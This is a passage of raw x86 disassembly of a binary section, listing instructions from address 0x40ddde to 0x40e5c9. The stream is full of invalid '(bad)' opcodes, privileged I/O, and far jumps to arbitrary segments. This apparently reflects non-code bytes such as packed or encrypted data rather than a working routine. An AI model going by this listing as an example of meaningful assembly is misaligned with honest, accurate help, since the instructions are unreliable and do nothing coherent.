  40ddde:	popa   
  40dddf:	pop    esi
  40dde0:	into   
  40dde1:	imul   esp,DWORD PTR [ebx],0xfa62783e
  40dde7:	data16 cs out 0x22,al
  40ddeb:	dec    eax
  40ddec:	and    dh,dl
  40ddee:	push   esp
  40ddef:	or     al,0x8b
  40ddf1:	es ins DWORD PTR es:[edi],dx
  40ddf3:	jbe    0x40de18
  40ddf5:	push   ecx
  40ddf6:	jns    0x40ddd7
  40ddf8:	daa    
  40ddf9:	pop    es
  40ddfa:	jecxz  0x40dda6
  40ddfc:	adc    al,BYTE PTR [eax+0x1]
  40ddff:	jne    0x40de2a
  40de01:	sbb    bh,BYTE PTR [eax-0x50a99596]
  40de07:	shr    cl,cl
  40de09:	cld    
  40de0a:	cli    
  40de0b:	xlat   BYTE PTR ds:[ebx]
  40de0c:	add    DWORD PTR [esi+ebx*8-0x16d44fc6],esi
  40de13:	adc    esp,edx
  40de15:	sbb    al,0x10
  40de17:	dec    ebx
  40de18:	es jp  0x40de12
  40de1b:	mov    bl,0x8
  40de1d:	cmp    eax,0x81e0b5a3
  40de22:	push   esi
  40de23:	lock (bad) 
  40de26:	test   eax,0x6b759f88
  40de2b:	cmp    eax,0x11f4a38c
  40de30:	je     0x40ddb4
  40de32:	clc    
  40de33:	inc    esi
  40de34:	jl     0x40ddf2
  40de36:	pusha  
  40de37:	mov    WORD PTR [ecx+0x16],es
  40de3a:	sbb    eax,0x2275b09d
  40de3f:	mov    BYTE PTR [esi+0x401cfd03],cl
  40de45:	and    ebx,edi
  40de47:	call   0xe56c8c5d
  40de4c:	inc    esp
  40de4d:	enter  0xe09f,0x44
  40de51:	xchg   ebx,eax
  40de52:	into   
  40de53:	outs   dx,DWORD PTR ds:[esi]
  40de54:	addr16 pop ds
  40de56:	mov    edx,0xaedcd92b
  40de5b:	xchg   ebp,eax
  40de5c:	out    dx,al
  40de5d:	xor    BYTE PTR [ebp-0xc388335],bl
  40de63:	xchg   esi,eax
  40de64:	enter  0x1497,0x9a
  40de68:	stos   DWORD PTR es:[edi],eax
  40de69:	daa    
  40de6a:	jns    0x40de32
  40de6c:	dec    eax
  40de6d:	sbb    DWORD PTR [edx+0x2b249e43],esp
  40de73:	pop    esi
  40de74:	cmp    BYTE PTR [ecx+0x18],dh
  40de77:	pop    ebx
  40de78:	or     ebp,ecx
  40de7a:	retf   
  40de7b:	jmp    0xbeb34aa6
  40de80:	pop    ebp
  40de81:	cwde   
  40de82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de83:	les    esi,FWORD PTR [ecx+eax*8+0x41785e0c]
  40de8a:	xchg   ecx,eax
  40de8b:	(bad)  
  40de8c:	sar    DWORD PTR [edx+0x522689a0],1
  40de92:	gs ins BYTE PTR es:[edi],dx
  40de94:	xor    al,0x63
  40de96:	pop    ecx
  40de97:	repz pop eax
  40de99:	jmp    0x310c:0xd55ae2f6
  40dea0:	pop    es
  40dea1:	cs cs cld 
  40dea4:	fstp   DWORD PTR [ebx]
  40dea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea7:	push   esp
  40dea8:	dec    esi
  40dea9:	push   es
  40deaa:	add    eax,0xc31f1a3a
  40deaf:	(bad)  
  40deb0:	pop    esi
  40deb1:	aas    
  40deb2:	fsubr  st(7),st
  40deb4:	clc    
  40deb5:	inc    edi
  40deb6:	int3   
  40deb7:	test   DWORD PTR [edi+0x2f],esp
  40deba:	jmp    0xaf02:0x517443d
  40dec1:	pop    ecx
  40dec2:	and    DWORD PTR [ebx-0x1d],0x2637b8fb
  40dec9:	out    0xe,eax
  40decb:	mov    cl,0xd2
  40decd:	cs jmp 0x41b:0x3210bc84
  40ded5:	jmp    0x2467:0x49ded59b
  40dedc:	shr    esi,1
  40dede:	gs pop eax
  40dee0:	int3   
  40dee1:	dec    ebx
  40dee2:	rcl    DWORD PTR es:0xc1997375,cl
  40dee9:	xor    DWORD PTR [ebx+0x1f26e410],0x8f6b1542
  40def3:	out    0xcf,al
  40def5:	push   0x60da80d1
  40defa:	(bad)  
  40defc:	stos   DWORD PTR es:[edi],eax
  40defd:	ret    0xaf34
  40df00:	mov    esp,DWORD PTR [ecx-0x22ff1deb]
  40df06:	leave  
  40df07:	popa   
  40df08:	dec    ebp
  40df09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df0a:	mov    al,ds:0xb02ab43c
  40df0f:	in     al,0x2e
  40df11:	adc    dh,bl
  40df13:	dec    eax
  40df14:	std    
  40df15:	(bad)  
  40df16:	(bad)  
  40df18:	outs   dx,DWORD PTR ds:[esi]
  40df19:	(bad)  
  40df1a:	sbb    edx,DWORD PTR [ebx-0x54258da0]
  40df20:	test   DWORD PTR [edx+eiz*4+0x72],ecx
  40df24:	enter  0x277b,0x17
  40df28:	cmp    al,0xed
  40df2a:	test   DWORD PTR [eax-0xa],0x149af8bb
  40df31:	xor    BYTE PTR [esi+0x287f07c9],dh
  40df37:	imul   ecx,DWORD PTR [ebx],0x4cb1f77c
  40df3d:	xchg   ecx,eax
  40df3e:	test   DWORD PTR [ebx+0x570a887a],esi
  40df44:	or     DWORD PTR [edx],esi
  40df46:	in     eax,0x2b
  40df48:	lods   al,BYTE PTR ds:[esi]
  40df49:	dec    eax
  40df4a:	add    ch,BYTE PTR [ecx-0x40a275ee]
  40df50:	or     ecx,ecx
  40df52:	mov    eax,ds:0x645f64ae
  40df57:	ror    BYTE PTR [edi+0x2d],1
  40df5a:	call   0xd3a94f50
  40df5f:	adc    BYTE PTR gs:[edi-0x20ff132],ch
  40df66:	fnstsw WORD PTR ds:0xb250e75c
  40df6c:	dec    edx
  40df6d:	inc    edi
  40df6e:	into   
  40df6f:	sub    eax,0x6cd9da97
  40df74:	jbe    0x40dfc1
  40df76:	(bad)  
  40df77:	fdivp  st(4),st
  40df79:	mov    edi,0xc9359df0
  40df7e:	jg     0x40df9e
  40df80:	xchg   esi,eax
  40df81:	pushf  
  40df82:	aas    
  40df83:	in     al,dx
  40df84:	rol    DWORD PTR [eax+eax*8],1
  40df87:	and    dl,ch
  40df89:	(bad)  
  40df8a:	sbb    eax,0x9b276074
  40df8f:	cmc    
  40df90:	jge    0x40dfe4
  40df92:	pop    edx
  40df93:	pop    esi
  40df94:	stos   DWORD PTR es:[edi],eax
  40df95:	dec    edi
  40df96:	mov    cl,BYTE PTR [edx+0x60]
  40df99:	mov    ebp,0x39fe24b0
  40df9e:	cwde   
  40df9f:	lods   al,BYTE PTR ds:[esi]
  40dfa0:	mov    edx,0x1522227c
  40dfa5:	or     cl,BYTE PTR [edx+0x2ab72b1a]
  40dfab:	pushf  
  40dfac:	popa   
  40dfad:	idiv   DWORD PTR [eax-0x184f4546]
  40dfb3:	(bad)  
  40dfb4:	sub    ecx,DWORD PTR [esi+0x7b992eb7]
  40dfba:	or     ch,BYTE PTR [ebp-0xa]
  40dfbd:	jne    0x40dfb2
  40dfbf:	imul   edx,ebx,0x26e9cf0a
  40dfc5:	icebp  
  40dfc6:	test   eax,0x3c61e388
  40dfcb:	sub    cl,BYTE PTR [edi]
  40dfcd:	xchg   dl,al
  40dfcf:	aam    0x80
  40dfd1:	test   BYTE PTR [edi-0xebffe19],ah
  40dfd7:	mov    ch,0xc
  40dfd9:	outs   dx,BYTE PTR ds:[esi]
  40dfda:	test   BYTE PTR [esi-0x67],dl
  40dfdd:	xchg   ebp,eax
  40dfde:	push   esi
  40dfdf:	sub    eax,0xf75092db
  40dfe4:	icebp  
  40dfe5:	aas    
  40dfe6:	xor    edx,DWORD PTR [edx+0x4a904d2b]
  40dfec:	xlat   BYTE PTR ds:[ebx]
  40dfed:	stc    
  40dfee:	(bad)  
  40dfef:	gs inc edi
  40dff1:	push   cs
  40dff2:	add    al,0xdc
  40dff4:	and    bh,BYTE PTR [edx-0x4d]
  40dff7:	(bad)  
  40dff9:	pusha  
  40dffa:	push   ss
  40dffb:	xchg   edx,eax
  40dffc:	dec    edi
  40dffd:	out    dx,eax
  40dffe:	or     dh,BYTE PTR [edi+ebx*2+0x581ef4c5]
  40e005:	rcl    DWORD PTR [esi],0x50
  40e008:	cs xchg esp,edx
  40e00b:	mov    eax,0xcfef8968
  40e010:	mov    fs,esi
  40e012:	ins    DWORD PTR es:[edi],dx
  40e013:	dec    esp
  40e014:	rol    DWORD PTR [eax],1
  40e016:	int    0x8b
  40e018:	mov    esp,0x6bcd3049
  40e01d:	popa   
  40e01e:	push   0xd8c3da70
  40e023:	sbb    BYTE PTR ds:0xb6121d00,al
  40e029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e02a:	imul   eax,DWORD PTR [ecx+0x68],0x4712cf1e
  40e031:	jns    0x40e099
  40e033:	rcl    DWORD PTR [edx+0x78],0x3
  40e037:	xor    BYTE PTR [ebp+0xd],0x2
  40e03b:	ret    0xb9b9
  40e03e:	test   DWORD PTR [eax],0xbc2d69e7
  40e044:	ja     0x40dfdb
  40e046:	in     eax,dx
  40e047:	shl    BYTE PTR [esi],1
  40e049:	xchg   DWORD PTR [ebx+0x4a47da9],ebx
  40e04f:	jecxz  0x40e0c2
  40e051:	jae    0x40dffe
  40e053:	fst    DWORD PTR [edi]
  40e055:	test   al,0xd2
  40e057:	rol    WORD PTR [ebp-0x2df33608],1
  40e05e:	mov    ecx,0x87c2c960
  40e063:	sub    DWORD PTR [ebp+ebx*4-0x34b656d9],eax
  40e06a:	push   cs
  40e06b:	mov    eax,ds:0xd6e6f673
  40e070:	dec    edx
  40e071:	push   esi
  40e072:	push   ss
  40e073:	bound  eax,QWORD PTR [esi-0x5d23d98b]
  40e079:	push   ecx
  40e07a:	in     al,dx
  40e07b:	dec    eax
  40e07c:	mov    ebx,0x336542be
  40e081:	int3   
  40e082:	bswap  esp
  40e084:	in     eax,0xf6
  40e086:	out    dx,al
  40e087:	adc    ecx,0xab82df71
  40e08d:	sbb    bl,BYTE PTR [edx]
  40e08f:	mov    edi,0x379b1a0f
  40e094:	xlat   BYTE PTR ds:[ebx]
  40e095:	jl     0x40e0c0
  40e097:	fnstenv [ebx+0x86b72bb]
  40e09d:	retf   
  40e09e:	mov    esi,0x7761ad47
  40e0a3:	fst    DWORD PTR [ecx-0x74]
  40e0a6:	pop    es
  40e0a7:	xchg   ecx,eax
  40e0a8:	jmp    0x14bf2396
  40e0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0ae:	(bad)  
  40e0af:	or     al,0xa5
  40e0b1:	fistp  QWORD PTR [ebx+ebp*2+0x3a]
  40e0b5:	scas   eax,DWORD PTR es:[edi]
  40e0b6:	sti    
  40e0b7:	data16 mov dl,0x97
  40e0ba:	outs   dx,BYTE PTR ds:[esi]
  40e0bb:	mov    bh,0xc8
  40e0bd:	xchg   esi,eax
  40e0be:	test   al,ah
  40e0c0:	cld    
  40e0c1:	inc    eax
  40e0c2:	push   cs
  40e0c3:	add    eax,0x5bb4a350
  40e0c8:	ret    0xd545
  40e0cb:	ret    0x8536
  40e0ce:	jmp    0x4a715714
  40e0d3:	ds push 0xb81d5a68
  40e0d9:	cmp    DWORD PTR [esi-0x3a],0xdd5dc3fd
  40e0e0:	retf   
  40e0e1:	aam    0xb4
  40e0e3:	lds    ecx,FWORD PTR [ebx-0x3815eb02]
  40e0e9:	mov    ecx,0x6fc151d7
  40e0ee:	jl     0x40e12e
  40e0f0:	repz and DWORD PTR [edx+0x32351815],edx
  40e0f7:	jge    0x40e12f
  40e0f9:	aad    0xfc
  40e0fb:	mov    eax,0x3d9c2d94
  40e100:	and    DWORD PTR [ecx+0x1c8a7ccb],edx
  40e106:	sub    al,cl
  40e108:	out    dx,eax
  40e109:	pop    esi
  40e10a:	mov    ecx,0xf62ea90e
  40e10f:	mov    eax,DWORD PTR [ecx]
  40e111:	dec    edi
  40e112:	cmp    ebx,DWORD PTR [ebx-0x64]
  40e115:	pop    edi
  40e116:	jnp    0x40e15a
  40e118:	jecxz  0x40e0f2
  40e11a:	or     al,0x31
  40e11c:	and    al,0x67
  40e11e:	push   ecx
  40e11f:	fidivr WORD PTR [edi-0x6e]
  40e122:	fst    st(2)
  40e124:	retf   0x121
  40e127:	push   cs
  40e128:	jecxz  0x40e14a
  40e12a:	lods   eax,DWORD PTR ds:[esi]
  40e12b:	fwait
  40e12c:	push   0xffffffc2
  40e12e:	stc    
  40e12f:	cmp    al,0x27
  40e131:	jmp    0xaa5:0xcfe45196
  40e138:	rcl    DWORD PTR [esi-0x31],1
  40e13b:	mov    dl,0x85
  40e13d:	lods   eax,DWORD PTR ds:[esi]
  40e13e:	cs dec ecx
  40e140:	js     0x40e10e
  40e142:	xchg   ecx,eax
  40e143:	jb     0x40e123
  40e145:	ins    DWORD PTR es:[edi],dx
  40e146:	mov    ecx,0x417377a8
  40e14b:	bound  si,DWORD PTR [ecx-0x1e0151e8]
  40e152:	ins    BYTE PTR es:[edi],dx
  40e153:	adc    eax,0x2c931329
  40e158:	jbe    0x40e120
  40e15a:	adc    eax,0x7de8d91
  40e15f:	push   ss
  40e160:	in     al,dx
  40e161:	xor    DWORD PTR [eax+0xbb7cc59],edi
  40e167:	outs   dx,DWORD PTR ds:[esi]
  40e168:	mov    ds:0x12d5e32d,eax
  40e16d:	je     0x40e160
  40e16f:	ficom  DWORD PTR [edx]
  40e171:	or     DWORD PTR [ebx],0xffffff84
  40e174:	mov    eax,ds:0x758f725d
  40e179:	int3   
  40e17a:	dec    edx
  40e17b:	push   0x1227b1f7
  40e180:	clc    
  40e181:	inc    BYTE PTR ds:[eax-0x4296e43c]
  40e188:	repz cdq 
  40e18a:	(bad)  
  40e18b:	sbb    DWORD PTR ss:[esp+eiz*8],ecx
  40e18f:	mov    eax,0x845c1e2e
  40e194:	jae    0x40e164
  40e196:	nop
  40e197:	call   0x55f8416c
  40e19c:	jns    0x40e1b2
  40e19e:	push   cs
  40e19f:	stos   DWORD PTR es:[edi],eax
  40e1a0:	and    ebp,ebp
  40e1a2:	dec    esi
  40e1a3:	popf   
  40e1a4:	jmp    0x40e1bf
  40e1a6:	cmp    al,dl
  40e1a8:	cli    
  40e1a9:	das    
  40e1aa:	and    esp,eax
  40e1ac:	test   DWORD PTR [esi+0x1f1a1f2d],eax
  40e1b2:	push   ds
  40e1b3:	popa   
  40e1b4:	and    al,dl
  40e1b6:	mov    ds:0x88c4d827,al
  40e1bb:	sub    DWORD PTR [ebp+0x3def90b3],ebx
  40e1c1:	xor    eax,0x324be36
  40e1c6:	jmp    0x40e1d1
  40e1c8:	rol    DWORD PTR [edx-0x7b492bd4],0x93
  40e1cf:	ror    DWORD PTR [esi-0x5ec44a2e],1
  40e1d5:	mov    WORD PTR [edx-0x37],cs
  40e1d8:	pushf  
  40e1d9:	arpl   WORD PTR [ebp+edx*4+0x61],bp
  40e1dd:	xchg   edx,eax
  40e1de:	lods   al,BYTE PTR ds:[esi]
  40e1df:	outs   dx,BYTE PTR ds:[esi]
  40e1e0:	mov    esi,0xd32fcb3a
  40e1e5:	inc    eax
  40e1e6:	into   
  40e1e7:	mov    ebx,0x8d018fb
  40e1ec:	jle    0x40e204
  40e1ee:	arpl   WORD PTR [edx-0x62],dx
  40e1f1:	push   0x6c
  40e1f3:	xchg   ebp,eax
  40e1f4:	push   ds
  40e1f5:	test   dh,al
  40e1f7:	sbb    al,0x4e
  40e1f9:	in     al,dx
  40e1fa:	jne    0x40e277
  40e1fc:	pop    edx
  40e1fd:	dec    ecx
  40e1fe:	mov    bh,0xcd
  40e200:	dec    esi
  40e201:	leave  
  40e202:	call   0x4eeedea
  40e207:	repnz pushf 
  40e209:	push   ebp
  40e20a:	sar    DWORD PTR [edi+ebx*4-0x696bcc05],1
  40e211:	mov    ebp,0x78cace9f
  40e216:	jbe    0x40e246
  40e218:	jp     0x40e1eb
  40e21a:	test   eax,0x28c28584
  40e21f:	mov    ch,0xd0
  40e221:	push   edi
  40e222:	jmp    0x40e1b4
  40e224:	and    BYTE PTR [edi+0x3f],al
  40e227:	rol    BYTE PTR [eax+0x2417327b],cl
  40e22d:	mov    ebx,0x898a5000
  40e232:	mov    bl,0x6f
  40e234:	push   edi
  40e235:	fadd   st,st(6)
  40e237:	mov    al,ds:0x304a0115
  40e23c:	xlat   BYTE PTR ds:[ebx]
  40e23d:	xor    al,0x9
  40e23f:	fidivr DWORD PTR [ecx+eax*8+0x69]
  40e243:	jmp    0xb755ba34
  40e248:	mov    ds:0x13b01fe1,eax
  40e24d:	jnp    0x40e249
  40e24f:	dec    edi
  40e250:	jmp    0xbb57a47c
  40e255:	pushf  
  40e256:	xchg   DWORD PTR [edx+0x1],esp
  40e259:	fist   WORD PTR [ebx]
  40e25b:	mul    BYTE PTR [esi-0x69864d30]
  40e261:	loope  0x40e208
  40e263:	jne    0x40e278
  40e265:	popf   
  40e266:	in     al,dx
  40e267:	add    ah,dh
  40e269:	pop    ebx
  40e26a:	cmp    bh,BYTE PTR [esi+eiz*8+0x2947b663]
  40e271:	icebp  
  40e272:	pop    edi
  40e273:	xchg   edi,eax
  40e274:	enter  0x1302,0x75
  40e278:	xchg   esi,eax
  40e279:	cs sbb eax,0x118911db
  40e27f:	je     0x40e23b
  40e281:	repnz imul esi,ecx,0xffffffe4
  40e285:	inc    ecx
  40e286:	xchg   edx,eax
  40e287:	add    bl,BYTE PTR [eax]
  40e289:	fwait
  40e28a:	out    dx,al
  40e28b:	jo     0x40e2ad
  40e28d:	in     al,dx
  40e28e:	and    BYTE PTR [esi+0x41acd4c1],bh
  40e294:	fnstcw WORD PTR [ebp+0x2b03f436]
  40e29a:	mov    al,0x15
  40e29c:	xchg   ebp,eax
  40e29d:	inc    ebx
  40e29e:	push   esp
  40e29f:	fs cli 
  40e2a1:	add    esp,DWORD PTR [esi]
  40e2a3:	dec    eax
  40e2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2a5:	lds    esi,FWORD PTR [ebx-0x2a]
  40e2a8:	aaa    
  40e2a9:	punpcklbw mm4,mm2
  40e2ac:	add    DWORD PTR [edi],ecx
  40e2ae:	or     ecx,ebp
  40e2b0:	leave  
  40e2b1:	daa    
  40e2b2:	mov    ecx,0xd554f589
  40e2b7:	shr    DWORD PTR ds:0xa2d3fa0a,0xc9
  40e2be:	inc    sp
  40e2c0:	aad    0xb0
  40e2c2:	enter  0x544f,0xee
  40e2c6:	pusha  
  40e2c7:	mov    esp,0x2fd71d28
  40e2cc:	cmc    
  40e2cd:	xchg   esp,eax
  40e2ce:	mov    edi,0x72d9213a
  40e2d3:	xchg   BYTE PTR [ebx-0x77aac69f],dl
  40e2d9:	xor    eax,0x8bfb3d1a
  40e2de:	push   ss
  40e2df:	test   dh,dl
  40e2e1:	jno    0x40e344
  40e2e3:	out    0xbc,eax
  40e2e5:	data16 ss repnz mov bl,0x4e
  40e2ea:	cwde   
  40e2eb:	comiss xmm3,xmm4
  40e2ee:	jle    0x40e366
  40e2f0:	loope  0x40e284
  40e2f2:	mov    bh,BYTE PTR ds:0xba84a2fa
  40e2f8:	mov    dl,0x76
  40e2fa:	mov    al,ds:0x3dbec11f
  40e2ff:	or     ebx,DWORD PTR [esi]
  40e301:	imul   edx,DWORD PTR [esi+edx*1-0x50],0xf925c32a
  40e309:	jmp    0x5d7e:0xc9fe1bd2
  40e310:	retf   0x3800
  40e313:	xor    eax,0xb17e692d
  40e318:	pop    eax
  40e319:	std    
  40e31a:	je     0x40e2d9
  40e31c:	push   esp
  40e31d:	(bad)  
  40e31e:	fild   WORD PTR [eax+0x7f600a9c]
  40e324:	inc    edi
  40e325:	imul   ebx,DWORD PTR [edi+0x57314700],0x27a53c5f
  40e32f:	jmp    0x788c:0xa342fe8a
  40e336:	dec    esi
  40e337:	repz loopne 0x40e30a
  40e33a:	fadd   DWORD PTR [esi+0x7a3d1208]
  40e340:	xor    BYTE PTR [edx],dl
  40e342:	int    0x15
  40e344:	inc    ebx
  40e345:	in     eax,0xfe
  40e347:	and    eax,0x98cb8d52
  40e34c:	dec    esp
  40e34d:	call   0x675008ca
  40e352:	fst    QWORD PTR [ebx-0x37113189]
  40e358:	inc    esp
  40e359:	scas   eax,DWORD PTR es:[edi]
  40e35a:	pop    esp
  40e35b:	imul   DWORD PTR [edx+0x40]
  40e35e:	mov    bh,0x5b
  40e360:	out    dx,al
  40e361:	xchg   BYTE PTR [edx+0x77ab6fc8],bh
  40e367:	xchg   ebx,eax
  40e368:	lds    ecx,FWORD PTR [edi+0x3c]
  40e36b:	jne    0x40e398
  40e36d:	aaa    
  40e36e:	jns    0x40e36c
  40e370:	addr16 addr16 push esp
  40e373:	cmp    al,0x7c
  40e375:	rol    DWORD PTR [ebx+edi*8-0x69],cl
  40e379:	imul   edi,DWORD PTR [esi],0xffffff9b
  40e37c:	pop    ss
  40e37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e37e:	dec    ebp
  40e37f:	mov    ebx,edx
  40e381:	mov    dh,cl
  40e383:	sbb    ecx,DWORD PTR [ebx+0x58]
  40e386:	adc    cl,BYTE PTR [edx]
  40e388:	rcr    DWORD PTR [ebp-0x29],cl
  40e38b:	scas   al,BYTE PTR es:[edi]
  40e38c:	inc    ecx
  40e38d:	xor    ch,dh
  40e38f:	hlt    
  40e390:	and    ebp,DWORD PTR [edx+0x668a918f]
  40e396:	sub    eax,0xd653aeb7
  40e39b:	pop    ebp
  40e39c:	sub    BYTE PTR [edi+edi*4-0x2a],0xb8
  40e3a1:	push   cs
  40e3a2:	or     ah,dh
  40e3a4:	sub    eax,0x707b7e16
  40e3a9:	mov    ds:0xaffec76,al
  40e3ae:	dec    eax
  40e3af:	adc    al,0xa6
  40e3b1:	clc    
  40e3b2:	ror    BYTE PTR [ebp+0x3d],0x3c
  40e3b6:	jbe    0x40e3d2
  40e3b8:	fadd   DWORD PTR [ecx-0x5c]
  40e3bb:	xor    al,0x71
  40e3bd:	pop    edi
  40e3be:	scas   al,BYTE PTR es:[edi]
  40e3bf:	inc    eax
  40e3c0:	cwde   
  40e3c1:	xchg   edi,eax
  40e3c2:	jbe    0x40e3d7
  40e3c4:	shl    cl,1
  40e3c6:	lds    edi,FWORD PTR ds:[ebx]
  40e3c9:	jg     0x40e394
  40e3cb:	pop    es
  40e3cc:	mov    cl,BYTE PTR [esi-0x1e670021]
  40e3d2:	adc    bh,dl
  40e3d4:	inc    edx
  40e3d5:	jnp    0x40e392
  40e3d7:	lods   al,BYTE PTR ds:[esi]
  40e3d8:	dec    eax
  40e3d9:	mov    ecx,0x68a89eeb
  40e3de:	in     al,dx
  40e3df:	cmp    eax,0x9cb4d77
  40e3e4:	and    cl,ah
  40e3e6:	xchg   edi,eax
  40e3e7:	aas    
  40e3e8:	mov    eax,ds:0xbc4f33de
  40e3ed:	pop    ebx
  40e3ee:	repz cmp eax,0x984bed7a
  40e3f4:	rcr    DWORD PTR ds:0xa782102d,1
  40e3fa:	sti    
  40e3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fc:	ja     0x40e3be
  40e3fe:	push   ebp
  40e3ff:	iret   
  40e400:	repnz shr DWORD PTR [ebx+0x2f],1
  40e404:	popf   
  40e405:	(bad)  
  40e407:	test   esp,ecx
  40e409:	mov    BYTE PTR [ecx+0x1cc911f7],al
  40e40f:	adc    al,0xe7
  40e411:	push   ebp
  40e412:	hlt    
  40e413:	in     eax,0x4e
  40e415:	mov    al,ds:0xc66490f3
  40e41a:	xor    BYTE PTR [ecx-0x2c],cl
  40e41d:	cmp    ch,BYTE PTR [esi+0x4b]
  40e420:	loope  0x40e3e2
  40e422:	push   es
  40e423:	mov    ds:0x99d1c9e,al
  40e428:	sbb    al,BYTE PTR [ecx+0x52c2ea18]
  40e42e:	je     0x40e3fb
  40e430:	cmp    eax,0x37df25d6
  40e435:	test   DWORD PTR cs:0xd7d2,0xc7efd8c1
  40e43f:	ret    
  40e440:	inc    ebp
  40e441:	pop    ss
  40e442:	clc    
  40e443:	mov    cl,BYTE PTR [ebx+esi*4-0x3c]
  40e447:	or     ah,BYTE PTR [ebx]
  40e449:	xor    DWORD PTR [edi-0x52],ebx
  40e44c:	dec    ebp
  40e44d:	sbb    ah,ah
  40e44f:	outs   dx,DWORD PTR ds:[esi]
  40e450:	inc    edi
  40e451:	dec    edx
  40e452:	xchg   esp,eax
  40e453:	mov    cl,cl
  40e455:	fdivr  QWORD PTR [esi]
  40e457:	jno    0x40e402
  40e459:	sti    
  40e45a:	mov    ?,WORD PTR [ebp-0x15]
  40e45d:	push   esi
  40e45e:	lds    edx,FWORD PTR [edi-0x39]
  40e461:	cs in  al,0x3d
  40e464:	loope  0x40e3f8
  40e466:	mov    al,ds:0x6e9cc1ed
  40e46b:	sbb    ch,BYTE PTR [esi+0x46]
  40e46e:	add    edx,DWORD PTR [ebx+0x1781be2f]
  40e474:	mov    esi,0xae81d04b
  40e479:	aad    0x23
  40e47b:	dec    esp
  40e47c:	lods   al,BYTE PTR ds:[esi]
  40e47d:	mov    ss,WORD PTR [esi+0x17918141]
  40e483:	rcr    dh,1
  40e485:	inc    edi
  40e486:	cdq    
  40e487:	mov    DWORD PTR [eax+0x1b],esp
  40e48a:	addr16 sub eax,0xfc61a36f
  40e490:	mov    eax,ds:0xd3465f16
  40e495:	(bad)  
  40e497:	xor    eax,0x4160a9af
  40e49c:	xchg   DWORD PTR fs:[eax-0x2a93adc1],ecx
  40e4a3:	xchg   ebx,eax
  40e4a4:	sub    dl,BYTE PTR [esi+0x65]
  40e4a7:	sar    DWORD PTR [esp+ebx*2-0x19],0x99
  40e4ac:	cmp    DWORD PTR [ecx-0xaf18482],ebx
  40e4b2:	jecxz  0x40e4f9
  40e4b4:	retf   
  40e4b5:	test   DWORD PTR [esi+ebp*1+0x40f3e9d1],eax
  40e4bc:	mov    al,0x96
  40e4be:	in     eax,dx
  40e4bf:	add    ch,bh
  40e4c1:	and    al,0x9e
  40e4c3:	in     al,dx
  40e4c4:	movups XMMWORD PTR [edx-0x5a876d7e],xmm5
  40e4cb:	int    0x2f
  40e4cd:	out    dx,al
  40e4ce:	mov    DWORD PTR [ebp+0x42],ebx
  40e4d1:	lods   eax,DWORD PTR ds:[esi]
  40e4d2:	and    eax,0xd3b25c7e
  40e4d7:	ss dec esp
  40e4d9:	stos   DWORD PTR es:[edi],eax
  40e4da:	mov    esp,0xba86a69a
  40e4df:	loope  0x40e52a
  40e4e1:	rol    BYTE PTR [esi+esi*1],1
  40e4e4:	lods   eax,DWORD PTR ds:[esi]
  40e4e5:	pmullw mm6,QWORD PTR [ecx+0x35ac8e21]
  40e4ec:	test   ah,ah
  40e4ee:	leave  
  40e4ef:	les    ebp,FWORD PTR [eax+edx*8+0x4b8a20f5]
  40e4f6:	or     DWORD PTR [ebx+edx*4],edi
  40e4f9:	jbe    0x40e520
  40e4fb:	jbe    0x40e49d
  40e4fd:	mov    WORD PTR [edi-0x42],es
  40e500:	or     esp,DWORD PTR [edi]
  40e502:	je     0x40e4ab
  40e504:	ret    
  40e505:	cmp    al,0x72
  40e507:	add    BYTE PTR [esi],dh
  40e509:	xchg   ecx,eax
  40e50a:	addr16 hlt 
  40e50c:	mov    dh,0xd4
  40e50e:	addr16 push esi
  40e510:	xchg   ebx,eax
  40e511:	jmp    DWORD PTR [edi+ebx*1]
  40e514:	stos   DWORD PTR es:[edi],eax
  40e515:	repnz push esi
  40e517:	adc    bh,BYTE PTR [ebx-0x3f3f5b25]
  40e51d:	inc    ecx
  40e51e:	sub    BYTE PTR [esp+ecx*4],ah
  40e521:	add    BYTE PTR [esp+esi*8+0x14],dh
  40e525:	jmp    0x1ae6:0xae5bbdb
  40e52c:	repnz mov WORD PTR [ebx+0x654b1349],ss
  40e533:	test   al,0xda
  40e535:	lahf   
  40e536:	popf   
  40e537:	mov    ecx,0x145d7ea6
  40e53c:	xor    cl,0xd5
  40e53f:	mov    ch,0x23
  40e541:	xchg   BYTE PTR [ecx-0x250f224c],ch
  40e547:	stc    
  40e548:	xor    eax,0xb350629b
  40e54d:	adc    ah,ah
  40e54f:	xchg   esi,eax
  40e550:	in     eax,dx
  40e551:	jb     0x40e5cb
  40e553:	jge    0x40e50b
  40e555:	out    dx,al
  40e556:	setg   BYTE PTR [ecx]
  40e559:	jmp    0x3663:0x77c9113c
  40e560:	pop    esp
  40e561:	lds    ebx,FWORD PTR [edx-0x4861bd0a]
  40e567:	push   ebx
  40e568:	icebp  
  40e569:	aad    0x77
  40e56b:	test   al,0xbf
  40e56d:	pushf  
  40e56e:	push   esi
  40e56f:	pop    ecx
  40e570:	shr    BYTE PTR [edi*4-0x1b757559],1
  40e577:	shl    BYTE PTR [edx],cl
  40e579:	jb     0x40e5bd
  40e57b:	fs ds fs call 0x2a2eea43
  40e583:	ret    0x51fb
  40e586:	in     al,0xb5
  40e588:	inc    esi
  40e589:	mov    edi,0x8c1d5dd4
  40e58e:	add    DWORD PTR [ebp-0x73],ebp
  40e591:	add    eax,0x43462dc
  40e596:	mov    dh,0x9d
  40e598:	(bad)  
  40e59a:	inc    ebx
  40e59b:	int    0x70
  40e59d:	fcmovne st,st(7)
  40e59f:	add    edi,DWORD PTR [ecx]
  40e5a1:	push   ebp
  40e5a2:	popf   
  40e5a3:	jnp    0x40e5da
  40e5a5:	mov    edx,0x33fdb458
  40e5aa:	sbb    BYTE PTR [eax],bh
  40e5ac:	es jg  0x40e606
  40e5af:	fcmovb st,st(3)
  40e5b1:	ja     0x40e5ac
  40e5b3:	fldenv es:[edi-0x20384030]
  40e5ba:	and    eax,0x2b1318c1
  40e5bf:	jl     0x40e5b6
  40e5c1:	jns    0x40e55b
  40e5c3:	mov    ebx,0xc253c9e0
  40e5c8:	dec    esi
  40e5c9:	and    al,0x6c
